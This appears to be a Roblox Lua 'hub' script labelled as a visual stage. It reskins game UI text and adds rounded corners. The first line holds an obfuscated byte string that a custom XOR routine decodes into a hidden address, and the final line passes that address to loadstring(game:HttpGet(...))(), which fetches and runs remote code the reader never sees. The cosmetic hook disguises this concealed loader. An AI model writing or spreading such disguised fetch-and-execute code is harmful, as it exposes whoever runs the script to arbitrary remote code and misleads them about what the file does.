
--[[ STAGE 2: VISUAL CORE ]]
local LjVwS8ADMii4nBD="\187\161\163\169\174\247\006\008\181\198\182\015\202\214\187\217\192\215\196\204\216\207\226\232\233\209\228\239\215\051\242\248\248\060\253\000\001\254\004\254\008\006\013\252\007\084\017\003\028\024\034\008\028\033\035\104\040\038\048\047\114\064\027\050\053\057\052\080\077\070\045\066\071\056\094\142\098\096\060\086\088\094\067\112\131\074\097\120\081\150\173\155\177\165\134\132\122\098\105\124\120\148\172\131\187\178\183\133\185\143\213\149\128\150"local Vr91eQy5HUXhumwUzO3=244 local plWhkXZoEl9x0yr9C=22 local q0KSZvjwDvwrec=0 local FCvWlosmalD_09AAt=2 local PbE2bBEJV8QkmmvwBMkF3x=7 local vBRfmfFZopdq3BPI=false local UaoM2LugDtMra_1n1Gtr=bit32 and bit32.bxor if not UaoM2LugDtMra_1n1Gtr then UaoM2LugDtMra_1n1Gtr=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local Gqt8VRDTrNkQE7lf={}for O9ql0mIaf_n8PPes0g=1,#LjVwS8ADMii4nBD do local hxeZv5ye2y4vF9SAGOYS=string.byte(LjVwS8ADMii4nBD,O9ql0mIaf_n8PPes0g)local ETY18y8gG9LejpeVeXH6b=(plWhkXZoEl9x0yr9C+(O9ql0mIaf_n8PPes0g*FCvWlosmalD_09AAt)+PbE2bBEJV8QkmmvwBMkF3x)%256 if q0KSZvjwDvwrec==0 then hxeZv5ye2y4vF9SAGOYS=(hxeZv5ye2y4vF9SAGOYS-ETY18y8gG9LejpeVeXH6b)%256 Gqt8VRDTrNkQE7lf[O9ql0mIaf_n8PPes0g]=string.char(UaoM2LugDtMra_1n1Gtr(hxeZv5ye2y4vF9SAGOYS,Vr91eQy5HUXhumwUzO3))else hxeZv5ye2y4vF9SAGOYS=UaoM2LugDtMra_1n1Gtr(hxeZv5ye2y4vF9SAGOYS,Vr91eQy5HUXhumwUzO3)Gqt8VRDTrNkQE7lf[O9ql0mIaf_n8PPes0g]=string.char((hxeZv5ye2y4vF9SAGOYS-ETY18y8gG9LejpeVeXH6b)%256)end end local h7ZgesnHMTOD=table.concat(Gqt8VRDTrNkQE7lf)if vBRfmfFZopdq3BPI then h7ZgesnHMTOD=string.reverse(h7ZgesnHMTOD)end local JXneegGoIV70ZH=h7ZgesnHMTOD
local HubName = "DEMENCTA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(JXneegGoIV70ZH))()
